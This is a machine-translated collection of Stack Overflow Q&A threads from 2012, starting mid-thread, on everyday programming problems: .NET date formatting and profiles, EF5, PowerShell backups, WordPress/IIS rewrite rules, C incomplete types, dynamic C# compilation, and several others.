日期和时间显然是正确的，但是我该如何设置才能将日期解析为对人类友好的方式？实际上没有任何代码要发布，因为日期是在插入行时添加的。我想将其格式化为“2012 年 9 月 28 日下午 2:56”。我怎么做？是否需要在将字符串解析为 JSON 之前或之后对其进行格式化？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-28T22:43:36.063

这根本不是一种“奇怪”的格式。第二种形式是ISO-8601；第一个是没有`T`. 考虑到您[*可以*](http://www.hanselman.com/blog/OnTheNightmareThatIsJSONDatesPlusJSONNETAndASPNETWebAPI.aspx)[在 JSON中获得](http://www.hanselman.com/blog/OnTheNightmareThatIsJSONDatesPlusJSONNETAndASPNETWebAPI.aspx)[的奇怪格式](http://www.hanselman.com/blog/OnTheNightmareThatIsJSONDatesPlusJSONNETAndASPNETWebAPI.aspx)*，看起来您已经很轻松了！*

 *序列化格式并不*意味着*用户友好，特别是 - 它们是机器对机器的格式。

我*希望*JSON.NET 会给你一个`DateTime`解析后的结果；它应该只在您转换回 JSON 后为您提供 ISO-8601 格式。

如果您有一个`DateTime`要格式化以供用户使用的格式，则有各种带有[标准](http://msdn.microsoft.com/en-us/library/az4se3k1.aspx)和[自定义](http://msdn.microsoft.com/en-us/library/8kb3ddd4.aspx)格式字符串的选项。不要忘记您应该尽可能尊重用户的文化 - 因此请确保您正在采取适当的步骤将线程的当前文化设置为用户的文化，或者您正在明确地传递文化到`DateTime.ToString`等

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-28T22:46:54.243

您可以在 C# 中尝试：

```
.ToString("MMM d yyyy, h:mm tt") 
```*

# asp.net - Asp.net Membership Profile FirstName and LastName（未声明。由于其保护级别，可能无法访问）

> ID：12648260
> 
> 赞同：2
> 
> 时间：2012-09-28T22:39:22.930
> 
> 标签：asp.net, error-handling, asp.net-membership, profile-provider, sqlprofileprovider

当我创建配置文件并添加项目时，它总是说没有在后面的代码中声明！

我试图将项目的Framework从Framework 4.0更改为Framework 3.5，但仍然无法正常工作。

它说 FirstNamep ， LastNamep 未声明。

在**Web.config**中：

```
 <profile defaultProvider="CustomProfileProvider" enabled="true">

   <providers>

  </providers>

  <!-- Define the properties for Profile... -->
  <properties>
      <add name="FirstNamep" type="String" />
      <add name="LastNamep" type="String" />

  </properties>
</profile> 
```

**代码背后：**

```
 Profile.FirstNamep = FirstNameTextBox.Text 
    Profile.LastNamep = LastNameTextBox.Text 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-28T23:03:00.507

这些属性是在运行时动态生成的，这意味着您无法从代码隐藏中访问它们。您可以做的是使用脚本块从您的 .ASPX 页面访问它们（如果适合您的话）。像这样。

```
<%@ Page Language="C#" %>

<script runat="server">
    public void Page_Init()
    {
        Profile.FirstNamep = "some dood";
    }
</script>

<div>Your name is <%= Profile.FirstNamep %></div> 
```

配置文件可用于 .aspx 页面，但不适用于背后的代码，这似乎是某种“设计使然”。

* * *

如果您已将默认提供程序定义为**CustomProfileProvider**，那么它[必须是一个继承的类`System.Web.Profile.ProfileProvider`](http://msdn.microsoft.com/en-us/library/0580x1f5%28v=vs.100%29.aspx)。否则，您应该[使用默认的 SQL 配置文件提供程序](http://msdn.microsoft.com/en-us/library/014bec1k%28v=vs.100%29.aspx)。

```
<connectionStrings>
   <add name="ApplicationServices" connectionString="data source=.\SQLEXPRESS;Integrated Security=SSPI;AttachDBFilename=|DataDirectory|\aspnetdb.mdf;User Instance=true" providerName="System.Data.SqlClient" />
</connectionStrings>

<membership>
    <providers>
        <clear/>
        <add name="AspNetSqlProfileProvider" type="System.Web.Profile.SqlProfileProvider" connectionStringName="ApplicationServices" applicationName="/" />
    </providers> 
```

# asp.net-mvc-3 - 播种时 EF5 中断

> ID：12648269
> 
> 赞同：2
> 
> 时间：2012-09-28T22:40:13.377
> 
> 标签：asp.net-mvc-3, entity-framework, seeding

我将我的 MVC 项目从 EF4.3.1 升级到了最新的 EF5。从那时起，我的数据库将始终无法初始化。如果我将引用改回 EF4.3.1，一切正常。是什么赋予了？

```
public class ArticleInitializer : DropCreateDatabaseAlways<ArticleContext>
{
    protected override void Seed(ArticleContext context)
    {
        Config.Articles.ForEach(article => context.Articles.Add(article));
        Config.Categories.ForEach(category => context.Articles.Add(category));
        Config.CareerAreas.ForEach(careerArea => context.Articles.Add(careerArea));
        context.SaveChanges();
    }
} 
```

# powershell - Powershell robocopy /mir 在 /mir 删除之前复制文件

> ID：12648272
> 
> 赞同：0
> 
> 时间：2012-09-28T22:40:47.120
> 
> 标签：powershell, delete-file, robocopy

我编写了一个执行以下步骤的 Powershell 脚本。

1.  它 RoboCopies 文件从服务器到外部硬盘驱动器（增量备份）
2.  下次它应该检查服务器上是否有任何文件被删除，如果是，则将这些文件从备份文件夹移动到备份硬盘驱动器中名为 _DeletedFiles 的文件夹。
3.  使用 /MIR 的 RoboCopy（这将删除服务器上已删除的文件以及备份中的文件，这没关系，因为我已经将它们保存在 _DeletedFiles 文件夹中）

这个 _DeletedFiles 文件夹的要点是，即使有人删除了文件，我们也希望将其保留至少 60 天。

现在这个脚本有点复杂，包括写入日志文件、测试路径和首次运行 if 语句等。

除了我想将服务器上删除的文件从备份复制到新文件夹的步骤之外，一切似乎都有效。

此步骤类似于以下内容：

```
$testfolder = Test-Path "$UsbDisk\$backupFolder"  

        # If a Backup folder already exist then Compare files and see if any changes have been made
        if ( $testfolder -eq $true ) { #IF_2  

                    # Copy deleted files to BackUp Folder
                    MyLog "Check for Deleted Files on E:\" 0                  
                    $source = "E:\"
                    $sourcelist = Get-ChildItem $source -Recurse
                    $destination = "$UsbDisk\$backupFolder\Data_01\_DeletedFiles"

                    foreach ($file in $sourcelist){
                    $result = test-path -path "E:\*" -include $file
                        if ($result -like "False"){
                            Copy-Item $file -Destination "$destination"
                        }

                    }

                    # Start Synchronizing E:\
                    MyLog "Start Synchronizing E:\" 0
                    Robocopy "E:\" "$UsbDisk\$backupFolder\Data_01" /mir /r:2 /w:3 /M /XD VM_*

                    MyLog "E:\ is up to Date" 0

                    # Copy deleted files to BackUp Folder
                    MyLog "Check for Deleted Files on F:\" 0    
                    $source = "F:\"
                    $sourcelist = Get-ChildItem $source -Recurse
                    $destination = "$UsbDisk\$backupFolder\Data_02\_DeletedFiles"

                    foreach ($file in $sourcelist){
                    $result = test-path -path "F:\*" -include $file
                        if ($result -like "False"){
                            Copy-Item $file -Destination "$destination"
                            # Then Delete it from the BackUp
                        }

                    }

                    # Start Synchronizing F:\
                    MyLog "Start Synchronizing F:\" 0
                    Robocopy "F:\" "$UsbDisk\$backupFolder\Data_02" /mir /r:2 /w:3 /M /XD VM_*

                    MyLog "F:\ is up to Date" 0

        } 
```

我得到的错误是文件无法复制，因为它们在目的地不存在；但是，它会尝试复制一开始就不应该复制的文件。

我想知道是否有人想更优雅地解决这个问题，或者如何修复我的代码片段。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-30T01:45:17.540

我认为问题可能出在测试路径命令中。我会`include $file`用`include $file.Name`. 该`include`参数需要一个字符串，而不是一个对象。

并且为了代码的可维护性，我也将替换`($result -like "False")`为`(-not $result`)。这是因为`$result`将包含一个布尔值（`$true`或`$false`），而不是一个字符串。

# wordpress - 将索引和一个文件夹重写为静态页面，WordPress 重写另一个文件夹

> ID：12648273
> 
> 赞同：1
> 
> 时间：2012-09-28T22:40:59.860
> 
> 标签：wordpress, apache, mod-rewrite, url-rewriting, rewrite

我希望所有的 WordPress 重写都能正常工作，除了：

*   首页为静态html页面，内容在根文件夹的index.html中
*   `/business`被路由到`business`根目录中包含静态 html 页面的文件夹。

当我将索引设置为`. /index.html [L]`没有任何常规 wordpress 重写工作时。但是，如果我设置`DirectoryIndex /index.html`我无法弄清楚如何让重写工作`/business`包含需要在`http://mywebsite.com/business`url 上提供的 HTML 文件。完全重写规则：

```
RewriteEngine On
RewriteBase /
RewriteRule ^index\.php$ - [L]
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
# RewriteRule . /index.php [L]
RewriteRule . /index.html [L] 
```

感谢您提供任何帮助，而不仅仅是一个答案，对您提供的每一行代码的作用的解释可能会帮助我自己和其他人了解下次如何自行处理。

*更新：*规则仍然不起作用。/wp-admin 一直在工作。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-10T09:57:42.750

尝试坚持使用默认的 WordPress 重写并简单地添加 DirectoryIndex 以首选 .html 文件而不是 .php 文件：

```
DirectoryIndex index.html index.php

RewriteEngine On
RewriteBase /
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule . /index.php [L] 
```

因此，仅当请求的文件或目录丢失时才会发生重写（带有 !-f 和 !-d 标志的 RewriteConds）。如果在一个目录（例如根目录）中有一个静态 index.html 和 index.php，它将首先被提供。

[http://httpd.apache.org/docs/2.2/mod/mod_dir.html#directoryindex](http://httpd.apache.org/docs/2.2/mod/mod_dir.html#directoryindex)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-09T06:37:57.473

将此代码替换为根目录中的 HTACCESS 文件

```
# Switch rewrite engine off in case this was installed under HostPay.
RewriteEngine Off

SetEnv DEFAULT_PHP_VERSION 53

DirectoryIndex index.cgi index.php

# BEGIN WordPress
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
RewriteRule ^index\.php$ - [L]
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule . /index.php [L]
</IfModule>

# END WordPress 
```

并且还从数据库中更改 URL...

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-29T00:15:48.927

尝试：

```
RewriteEngine On
RewriteBase /
RewriteRule ^index\.html$ - [L]
RewriteRule ^business/ - [L]
RewriteRule ^index\.php$ - [L]
RewriteRule ^$ /index.html [L]
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule . /index.php [L] 
```

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2012-10-05T12:46:44.363

需要解决两个问题：

1.  每当有人需要首页时提供特定的 HTML 文件。
2.  在 WordPress 旁边提供静态目录中的静态文件。

为了解决第一个问题，我将 index.html 重命名为 front-page.php 并将其移动到我当前的主题文件夹中。然后，根据[Template Hierarchy](http://codex.wordpress.org/File%3aTemplate_Hierarchy.png) ，每当有人请求首页时，WordPress 都会提供它（或者更确切地说：将其用作模板） 。

与实际提供静态文件相比，此解决方案存在成本：每当有人请求您的首页时，仍会加载 WordPress。如果静态提供首页的目标是通过在每次页面加载时不加载 WordPress 或 PHP 来节省服务器资源，那么您应该考虑使用缓存插件。

第二个问题根本不应该是一个问题，因为标准的 WordPress 重写规则已经允许静态文件和目录。线条

```
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d 
```

意味着如果请求的 URL 是实际文件 (-f) 或目录 (-d)，则不会发生重定向到 WordPress。因此，您不需要任何额外的重写规则来访问 /business 目录。

标准的 WordPress 重写规则解释如下：

```
RewriteEngine On                    # Turn on the rewrite engine
RewriteBase /                       # Use the domain root as the base of rewrites
RewriteRule ^index\.php$ - [L]      # If someone requests the WordPress entry point, stop here
RewriteCond %{REQUEST_FILENAME} !-f # If the requested URL is not an actual file ...
RewriteCond %{REQUEST_FILENAME} !-d # ... and if the requested URL is not an actual directory ...
RewriteRule . /index.php [L]        # ... then rewrite it to the main WordPress entry point 
```

当 /index.php 被加载时，这个文件将依次加载 WordPress 和它附带的所有东西。

# c - “数组类型的元素类型不完整”是什么意思？

> ID：12648274
> 
> 赞同：1
> 
> 时间：2012-09-28T22:41:00.983
> 
> 标签：c, hashtable, glib, gcc4

我有以下简单的代码行：

```
#include <glib.h>
#include <stdio.h>

void my_func () {
    GHashTable htbls[3]; /* ASSUME LINE NUMBER IS N */
    /* Do something */
}

int main (int argc, char *argv[]) {
    my_func ();
    return 0;
} 
```

但

```
$gcc `pkg-config --cflags --libs glib-2.0` ./main.c 
```

给出以下错误：

```
./main.c:N: error: array type has incomplete element type 
```

我不明白为什么元素类型不完整。 `GHashTable`中完全指定`glib.h`。

在此先感谢您的帮助。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-09-28T22:46:35.160

这可能意味着`GHashTable`您包含的标题中没有完全定义。也就是说，`glib.h`它包含的文件中可能有一行或一个文件，内容如下：

```
typedef struct GHashTable GHashTable; 
```

在不改变我的论点的情况下，结构标签可能会有所不同。必须有类似的东西，否则你会收到关于`GHashTable`不被识别为类型名称的不同消息：

```
error: unknown type name 'GHashTable' 
```

中没有提供关于结构的额外信息`<glib.h>`；你不需要知道它来使用它。哈希表函数的 API 可能只处理`GHashTable *`值，所以你不需要知道里面有什么，就像你需要知道 a 里面有什么`FILE *`才能在你的代码中使用它一样（尽管宏化函数比如`getchar()`可能需要了解 的内部结构`FILE *`；也许更好的类比是`DIR *`，但这是一个 POSIX 接口，不一定众所周知）。

这意味着您将需要使用：

```
 GHashTable *htbls[3]; 
```

您可以毫无问题地拥有指向不完整类型的指针数组。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-09-28T22:45:20.500

你确定吗？从 glib.h 复制/粘贴规范。（我的 glib.h 不包含 GHashTable 的定义）。

您需要使用指针，而不是值：

```
GHashTable* htbls[3]; 
```

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2012-09-28T22:48:41.023

Q: GHashTable 不是完全在 glib.h 中指定的吗？

答：没有。

如果你想要一个哈希表，你应该使用 g_hash_table_new()、g_hash_table_add() 和朋友：

*   [http://developer.gnome.org/glib/stable/glib-Hash-Tables.html](http://developer.gnome.org/glib/stable/glib-Hash-Tables.html)

换句话说，“struct _GHashTable”对您的应用程序是不透明的。

如果你真的想要一个 GHashTables 数组，那么你需要一个“GHashTable *”数组。而且您需要使用自己的新哈希表显式初始化数组的每个元素。

# regex - IIS 重写规则以检查查询字符串，如果不存在则添加它

> ID：12648281
> 
> 赞同：4
> 
> 时间：2012-09-28T22:42:14.963
> 
> 标签：regex, iis-7, url-rewriting, isapi-rewrite, url-rewrite-module

我正在尝试制定一个将 URL 参数附加到 URL 的 IIS URL 重写规则。url 参数是`hssc`. 因此，通过服务器处理的任何 url 都需要该参数。请记住，某些 url 已经有自己的参数，而其他 url 不会，以及根 url 等，有时它需要添加`?hssc=1`或`&hssc=`- 所以，如果我有一个这样的 URL：

*   [http://www.blah.com](http://www.blah.com)应该变成[http://www.blah.com/?hssc=1](http://www.blah.com/?hssc=1)
*   [http://www.blah.com/index.html](http://www.blah.com/index.html)应该变成[http://www.blah.com/index.html?hssc=1](http://www.blah.com/index.html?hssc=1)
*   [http://www.blah.com/?q=5](http://www.blah.com/?q=5)应该变成[http://www.blah.com/q=5&hssc=1](http://www.blah.com/q=5&hssc=1)
*   [http://www.blah.com/index.html?q=5](http://www.blah.com/index.html?q=5)应该变成[http://www.blah.com/index.html?q=5&hssc=1](http://www.blah.com/index.html?q=5&hssc=1)
*   [http://www.blah.com/index.html?q=5&hssc=1](http://www.blah.com/index.html?q=5&hssc=1)应该不理会

我还希望 URL 不应该被隐藏（就像在后台重写一样）。我需要 URL 出现在 URL 中，所以当用户复制 URL 或添加书签时，参数就在那里。

我已经设置了条件来匹配它`\&hssc|\?hssc`——现在我只需要一种方法来编写 URL，这样它就会出现并保留已经存在的原始 URL 的一部分。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-30T06:26:40.677

想通了 - 规则将这样设置：

```
<rewrite>
            <rules>
                <rule name="sigh" patternSyntax="ECMAScript" stopProcessing="true">
                    <match url="(.*)" negate="false" />
                    <action type="Redirect" url="{PATH_INFO}?hssc=1" />
                    <conditions>
                        <add input="{QUERY_STRING}" pattern="^hssc=|\?hssc=|\&amp;hssc=" negate="true" />
                    </conditions>
                </rule>
            </rules>
        </rewrite> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-28T23:25:15.473

只是作为通过代码维护 QS 的提示：

```
public static string GetQS()
{
  var sb = new System.Text.StringBuilder();

  System.Collections.Specialized.NameValueCollection Qs = HttpContext.Current.Request.QueryString;

  var lst = new List<string>(Qs.AllKeys);

  foreach (string s in lst)
  {
    if (s == "MyOwnQSKey")
      sb.Append(s + "=" + "MyValue" + "&");
    else
      sb.Append(s + "=" + Qs[s] + "&");
  }

  if (!lst.Contains("MyOwnQSKey"))
    sb.Append("MyOwnQSKey=MyValue&");

  if (sb.ToString().EndsWith("&"))
    sb.Remove(sb.Length - 1, 1);

  return "?" + sb;
} 
```

我刚刚从我的一个项目中复制了这个，类似于你在 Url-Rewrite 和 QS 中的项目

希望这有帮助

# c# - 与 CSharpCodeProvider 生成的程序集交互

> ID：12648290
> 
> 赞同：0
> 
> 时间：2012-09-28T22:43:37.763
> 
> 标签：c#, codedom

我制作了一个用于学习/实验的玩具编译器。

下面是编译一些 C# 代码的代码：

```
using System;
using System.CodeDom.Compiler;
using System.Reflection;
using Microsoft.CSharp;

namespace ProgrammingSystem
{
    public class Compiler
    {
        public Program Compile(Code code)
        {
            string template = @"
public class C 
{
    public static void Main(string[] args) 
    { 
        [[Source]] 
    } 
}";

            string source = template.Replace("[[Source]]", code.Source);

            CodeDomProvider compiler = new CSharpCodeProvider();

            CompilerParameters parameters = new CompilerParameters();
            parameters.WarningLevel = 4;
            parameters.GenerateExecutable = false;
            parameters.GenerateInMemory = true;

            CompilerResults r = compiler.CompileAssemblyFromSource(parameters, source);
            foreach (var item in r.Output)
                this.Fire(Output, item);            

            Assembly assembly = r.CompiledAssembly;

            return new Program(assembly);
        }

        public event EventHandler<OutputEventArgs> Output;
    }
} 
```

这是运行编译后的代码的代码：

```
using System;
using System.Reflection;

namespace ProgrammingSystem
{
    public class Program
    {
        private System.Reflection.Assembly assembly;

        public Program(System.Reflection.Assembly assembly)
        {
            this.assembly = assembly;
        }

        public event EventHandler<OutputEventArgs> ProgramOutput;

        public void Run()
        {
            Type[] types = this.assembly.GetTypes();
            Type programType = types[0];
            MethodInfo programMainMethod = programType.GetMethod("Main");
            programMainMethod.Invoke(null, new object[] { new string[] { } });

            this.Fire(ProgramOutput, "hello");
        }
    }
} 
```

我可以通过什么方式与[CSharpCodeProvider](http://msdn.microsoft.com/en-us/library/microsoft.csharp.csharpcodeprovider%28v=vs.100%29.aspx)在运行时生成的类型进行通信？

具体来说，我对订阅公共委托或捕获标准输出感兴趣，但是关于类型如何在这种情况下相互通信的一般信息就足够了。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-28T23:34:54.703

我使用[此处](http://msdn.microsoft.com/en-us/library/ms228976%28v=vs.100%29.aspx)的文档解决了这个问题。

```
using System;
using System.Reflection;

namespace ProgrammingSystem
{
    public class Program
    {
        private System.Reflection.Assembly assembly;

        public Program(System.Reflection.Assembly assembly)
        {
            this.assembly = assembly;
        }

        public event EventHandler<OutputEventArgs> ProgramOutput;

        public void Run()
        {
            Type programType = this.assembly.GetType("C");
            object program = Activator.CreateInstance(programType);
            EventInfo outputEvent = programType.GetEvent("output");
            Delegate delegateInstance = Delegate.CreateDelegate(
                                                    outputEvent.EventHandlerType, this,
                                                    typeof(Program).GetMethod("OutputHandler", BindingFlags.NonPublic | BindingFlags.Instance));
            MethodInfo addHandlerMethod = outputEvent.GetAddMethod();
            addHandlerMethod.Invoke(program, new [] { delegateInstance });

            programType.GetMethod("Run").Invoke(program, null);
        }

        private void OutputHandler(string s)
        {
            this.Fire(ProgramOutput, s);
        }
    }
}

using System;
using System.CodeDom.Compiler;
using System.Reflection;
using Microsoft.CSharp;

namespace ProgrammingSystem
{
    public class Compiler
    {
        public Program Compile(Code code)
        {
            string template = @"
using System;
public class C 
{
    public event Output output;
    public void Run() 
    { 
        [[Source]]
        output(""end"");
    }
}
public delegate void Output(string s);
";

            string source = template.Replace("[[Source]]", code.Source);

            CodeDomProvider compiler = new CSharpCodeProvider();

            CompilerParameters parameters = new CompilerParameters();
            parameters.WarningLevel = 4;
            parameters.GenerateExecutable = false;
            parameters.GenerateInMemory = true;

            CompilerResults r = compiler.CompileAssemblyFromSource(parameters, source);
            foreach (var item in r.Output)
                this.Fire(Output, item);            

            Assembly assembly = r.CompiledAssembly;

            return new Program(assembly);
        }

        public event EventHandler<OutputEventArgs> Output;
    }
} 
```

# php - 使用 fopen() 后 PHP 清理内存

> ID：12648291
> 
> 赞同：2
> 
> 时间：2012-09-28T22:43:41.420
> 
> 标签：php, fopen, fclose

当我使用`fopen();`然后我使用`fclose();`它只是关闭文件还是清理内存？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-28T22:46:13.987

它还清理内存。

顺便说一句，PHP 使用自己的垃圾收集功能自行完成（即使没有显式关闭指针）。不过，明确地关闭它仍然是一个好习惯。

# magento - 自定义 Magento 主页 - 修复问题

> ID：12648293
> 
> 赞同：0
> 
> 时间：2012-09-28T22:43:58.660
> 
> 标签：magento, plugins, indexing, magento-1.4

因此，之前的 Web 开发人员已经定制了我们的 Magento v1.4.1 站点以使用名为 main.php 的页面......它绕过了 Magento 设置的所有其他内容，就 Magento 而言。

我无法联系以前的开发人员询问这是在哪里设置的...

我们刚刚安装了一个新插件，它已经接管了主页。

在 Magento Admin > System > Configuration > Web 中，主页设置为 URL Key "home" ...当我转到该特定页面 index.php/home 时，会显示自定义 main.php 页面。为什么一个插件会成为我们的主页？

谢谢！感觉我之前的问题没有提供足够的细节。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-29T12:03:22.717

“home”不是正常值，该部分应如下所示：

![默认网页配置](../Images/22ba6a756636701756f8700488aa4543.png)

# android - Xperia Tablet S 上的小应用 API

> ID：12648294
> 
> 赞同：2
> 
> 时间：2012-09-28T22:44:00.900
> 
> 标签：android, sony

我最近开始使用本文提供的示例开发一个小型应用程序。[http://developer.sonymobile.com/2012/09/26/let-your-app-stay-on-top-with-small-apps-for-xperia-tablet-s/](http://developer.sonymobile.com/2012/09/26/let-your-app-stay-on-top-with-small-apps-for-xperia-tablet-s/)

有谁知道我是否可以将一个小应用程序作为我现有应用程序的一部分，扩展为包含在我的常规 apk 代码中的一个小应用程序，或者我需要将另一个 apk 专门作为一个小应用程序上传到 Google PLAY？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-03T00:26:41.533

基于 Small-App API 的应用程序可以是现有应用程序的一部分。

如果您想在当前应用程序中支持 Small Apps API，您需要执行以下操作。

在 Android 清单中添加以下行：

```
<uses-library android:name="com.sony.smallapp.framework” android:required="false" /> 
```

上面的代码确保该库不用于过滤掉不支持它的设备的应用程序。然后，您可以在启动器活动或单独的类中使用以下代码动态检查该类。

```
1\.  String checkLibrary = "com.sony.smallapp.framework";  
2\.  try {  
3\.      Class libraryToInvestigate = Class.forName(checkLibrary);  
4\.      // Dynamically initiate the library  
5\.       // Initiate constructor or methods
6\.  } catch (ClassNotFoundException e) {  
7\.      // If class is not found(Small Apps API not supported), handle exception and use a home widget or normal activity as fallback
8\.  } catch (Exception e) {  
9\.      // Unknown exception  
10\. } 
```

有关在 Java 中使用反射的更多参考，请查看以下链接：http: [//mobile.tutsplus.com/tutorials/android/java-reflection/](http://mobile.tutsplus.com/tutorials/android/java-reflection/)

有关 android 清单中使用库的信息，请查看此链接：http: [//developer.android.com/guide/topics/manifest/uses-library-element.html](http://developer.android.com/guide/topics/manifest/uses-library-element.html)

# javascript - 在 python 3.2 中运行 Javascript

> ID：12648299
> 
> 赞同：0
> 
> 时间：2012-09-28T22:44:28.797
> 
> 标签：javascript, python-3.x

我正在尝试创建一个可以登录网站的 python 程序。我写了可以登录的javascript；但是，我还没有看到在 python 中运行 javascript 的任何内容。我正在考虑实现firefox javascript引擎seamonkey，但也不知道如何在python中做到这一点。

任何帮助都会很棒。谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-29T09:31:54.310

*如果可能的话，将Python*与*JavaScript*混合起来可能会很困难，而且我认为这不是理想的方法。

对于纯*Python*解决方案，我建议[mechanize](http://pypi.python.org/pypi/mechanize/0.2.5)。

对于纯*JavaScript*的解决方案，[PhantomJS](http://phantomjs.org/)似乎是一个非常有趣的框架。

# java - Java的C ++库等效？

> ID：12648300
> 
> 赞同：0
> 
> 时间：2012-09-28T22:44:54.070
> 
> 标签：java

什么相当于 C++ 中的 Java 库？我有一些类我想在多个项目中作为库重用。

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-28T22:45:35.627

基本上，您构建一个包含类的 jar 文件，然后在类路径上添加对该 jar 文件的引用以进行编译和执行。

有关详细信息，请参阅[Oracle Jar 文件教程](http://docs.oracle.com/javase/tutorial/deployment/jar/)。

# c# - 如何为自定义配置文件添加配置转换？

> ID：12648302
> 
> 赞同：7
> 
> 时间：2012-09-28T22:44:58.393
> 
> 标签：c#, asp.net, .net, visual-studio, web-config

Visual Studio 原生支持为 web.config 添加自定义配置转换。有没有办法为自定义配置文件做同样的事情？例如，我所在的商店`EnvironmentConfigs`在项目的根目录中有一个目录，并且有自定义`appSettings.config`和`connectionStrings.config`文件。有没有办法做与 web.config 相同的事情，并添加`appSettings.Release.config`和`connectionStrings.Release.config`转换文件以在发布时转换它们？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-28T22:47:25.050

我不确定这样的配置，但请查看 VS2010 中的 Slow Cheetah 扩展。您可以通过转到工具 > 扩展管理器并搜索在线图库来安装它。它增加了对 App.Config 使用配置转换的能力，并且可能会在您描述的场景中工作。它通常添加了很多转换功能（甚至是 web.config 的），所以它是一个很好的工具。不过，开箱即用的 VS2010 不会那样做。

编辑：根据对 SlowCheetah 的描述：“此包使您能够根据构建配置转换 app.config 或任何其他 XML 文件”。所以是的，它似乎会做你需要的......

# java - 仅使用消息队列或 Web 服务方法进行系统集成的 EJB 或 ESB

> ID：12648307
> 
> 赞同：1
> 
> 时间：2012-09-28T22:45:22.960
> 
> 标签：java, jakarta-ee, ejb, integration, esb

从系统集成的角度来看，将 ESB（企业服务总线）中间件技术而不是 EJB 用于大中型应用程序是常见的做法，还是主要为 BPM（业务流程管理）应用程序保留使用 ESB 中间件？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-01T20:21:44.377

ESB 主要用作集成层，以实现系统的集成，使用不同的消息格式，用于代理、路由、消息转换、负载平衡、使用不同的协议等。上述部分或全部或更多。esb 可能是一个成熟的商业/开源系统，或者只是一个代理或路由器应用程序，如果需要，可以使用 ejb 来实现。要评论 ESB 和 EJB，它们是不相关的，它们服务于不同的目的。

BPM 通常涉及消息编排、不同服务、消息格式和系统之间的交互，因此 esb 往往会出于集成的目的而出现。为了评论您的观点，ESB 既不是 BPM 保留的，也不是强制性的。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-29T19:04:10.180

在我看来，ESB 不仅仅适用于 BPM。
使用 ESB 可以创建分布式架构。
分布式架构的好处是众所周知的（例如 - 可扩展性）。
当然，ESB 并不是实现这一目标的唯一解决方案，而是可用的解决方案之一。
请注意，如果您需要一个分布式架构，它没有很多服务 + 协议的差异化（即 - 使用 HTTP、JMS 等......），您应该考虑另一种解决方案。
当您有许多使用不同协议的服务时，ESB 可以为您提供帮助（例如，想象一个组件接受，而另一个组件在 JMS 队列上侦听 - 您可能需要发送“逻辑上”相同的消息，但应该是曾经说过给第一个服务，稍后应该发送给第二个服务 -
ESB 将帮助您执行此任务）。[我建议您在此](http://blogs.mulesoft.org/to-esb-or-not-to-esb/)博客
上阅读有关此主题的更多信息。

# python - 在后台启动可以提示用户输入密码的python程序

> ID：12648310
> 
> 赞同：1
> 
> 时间：2012-09-28T22:45:57.230
> 
> 标签：python, daemon, background-process

基本上我想在后台启动一个守护进程，它仍然会在控制台中提示用户输入密码。我用 pexpect 创建了这个，但是当这个程序结束时，它会杀死守护进程，因为它是一个子进程。所以显然 pexpect 不会为此工作。有没有人知道这样做的方法？

```
#!/usr/bin/env python
import pexpect
import getpass
child = pexpect.spawn('python daemon.py &')
child.expect_exact('Password:')

passwd = getpass.getpass()

child.sendline(passwd)

index = child.expect_exact('Started Successfully')
print index 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-28T23:03:30.920

pexpect 有一个方法[close(self, force=True)](http://pexpect.sourceforge.net/pexpect.html#spawn-close)关闭它与子进程的连接。

根据文档，如果 force=True 则终止子进程

```
child.close(force=False) 
```

应该断开连接，但让应用程序继续运行。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-28T23:33:06.843

Dany 建议：“您是否考虑过使用 os.fork() 然后运行守护程序模块？”

您的回答是“是的，但我不知道如何将密码传递给守护程序。必须确保密码安全，即不要存储在硬盘上，也不要在屏幕上显示它。”

但是您无需执行任何操作即可将密码传递给守护程序。分叉后，它仍然可以访问。例如：

```
passwd = getpass.getpass()
pid = os.fork()
if pid:
  print 'Parent thinks passwd is', passwd
else:
  print 'Child thinks passwd is', passwd 
```

所以，在父进程中读取密码，然后分叉守护进程；它已经有了密码，所以它不需要任何 tty。问题解决了。

# php - Shadowbox PHP Facebook Graph Api 错误

> ID：12648311
> 
> 赞同：0
> 
> 时间：2012-09-28T22:46:10.610
> 
> 标签：php, javascript, facebook, facebook-graph-api, shadowbox

如您所知，我正在为我的网站使用 shadowbox 通过单击缩略图来打开大图像。我的问题是，我正在获取用户的 Facebook 个人资料照片，例如：

```
$large = "https://graph.facebook.com/{$id2}/picture?type=large";
$small = "https://graph.facebook.com/{$id2}/picture?type=square"; 
```

它工作完美，但在影子盒中我有大图像的问题..

我在 shadowbox 中这样称呼它：

```
<a href="<?php echo $large; ?>" rel="shadowbox">
<img style="max-width:50px; max-height:50p;" src="<?php echo $small; ?>" />
</a> 
```

